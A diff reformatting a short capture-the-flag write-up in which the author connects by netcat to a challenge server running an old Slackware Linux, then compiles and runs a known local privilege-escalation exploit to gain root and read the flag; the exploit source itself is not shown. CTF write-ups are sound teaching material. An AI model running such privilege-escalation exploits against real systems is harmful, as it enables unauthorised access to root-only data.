@@ -26,7 +26,8 @@ tags:
 
 This challenge was pretty simple and obvious. We are given with a website that is requesting a &#8216;proof of work&#8217; from us to reduce the load on their infrastructure. We need to press start and then we get a port to which we can connect using `netcat`, username and password. We connect to the server and search for the flag.
 
-<pre class="lang:sh mark:3,11,14 decode:true">Megabeets:~# nc 78.46.224.70 2323
+```sh
+Megabeets:~# nc 78.46.224.70 2323
 
 Welcome to Linux 0.99pl12.
 
@@ -40,7 +41,9 @@ slack:~$ id
 uid=405(challenge) gid=1(other)
 slack:~$ ls -la / | grep flag
 -r--------   1 root     root           36 Dec 27  1916 flag.txt
-slack:~$</pre>
+slack:~$
+```
+
 
 Look at the highlighted rows. We can see that we are in _Slack Linux 0.99pl12_ machine, that _flag.txt_ is on the root folder and that only _root_ can read it. Before trying anything special or complicated, lets search online for known exploit to this version.
 
@@ -50,7 +53,8 @@ Look at the highlighted rows. We can see that we are in _Slack Linux 0.99pl12_ 
 
 Lets run it to see if it works, and if so read the flag.
 
-<pre class="lang:sh decode:true">slack:~$ gcc exploit.c -o exploit
+```sh
+slack:~$ gcc exploit.c -o exploit
 slack:~$ id
 uid=405(challenge) gid=1(other)
 slack:~$ ./exploit
@@ -58,7 +62,9 @@ slack:~$ ./exploit
 # id
 uid=405(challenge) gid=1(other) euid=0(root) egid=18(lp)
 # cat /flag.txt
-33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</pre>
+33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3
+```
+
 
 &nbsp;
 
